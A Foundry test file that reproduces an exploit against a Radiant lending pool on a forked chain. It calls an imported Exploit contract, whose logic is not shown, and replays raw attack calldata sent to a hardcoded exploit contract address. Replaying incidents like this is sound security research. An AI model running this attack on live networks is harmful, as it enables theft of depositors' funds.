// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {Test, console} from "forge-std/Test.sol";
import {Exploit} from "contracts/exploit/Exploit.sol";

contract ExploitTest is Test {
    address constant EXPLOIT = 0x39519c027b503f40867548Fb0c890b11728faA8F;
    address constant AAVE_IMPL = 0xbCb167bDCF14a8F791d6f4A6EDd964aed2F8813B;

    address constant RADIANT_LENDING_POOL = 0xF4B1486DD74D07706052A33d31d7c0AAFD0659E1;
    address constant RADIANT_ATOKEN = 0x3a2d44e354f2d88EF6DA7A5A4646fd70182A7F55;

    function setUp() public {
        vm.createSelectFork(
            "YOUR_API_KEY",
            166405686
        );
    }

    function testExploit() public {
        Exploit exp = new Exploit();
        exp.exploit(RADIANT_LENDING_POOL, RADIANT_ATOKEN, 1e6 * 3e6);

    }

    function testReplay() public {
        bytes
            memory callData = hex"34ad3fac000000000000000000000000000000000000000000000000000002ba7def3000000000000000000000000000f4b1486dd74d07706052a33d31d7c0aafd0659e10000000000000000000000003a2d44e354f2d88ef6da7a5a4646fd70182a7f550000000000000000000000000df5dfd95966753f01cb80e76dc20ea958238c46000000000000000000000000c6962004f452be9203591991d15f6b388e09e8d000000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000000";
        payable(EXPLOIT).call{value: 0.000069 ether}(
            callData
        );

    }
}
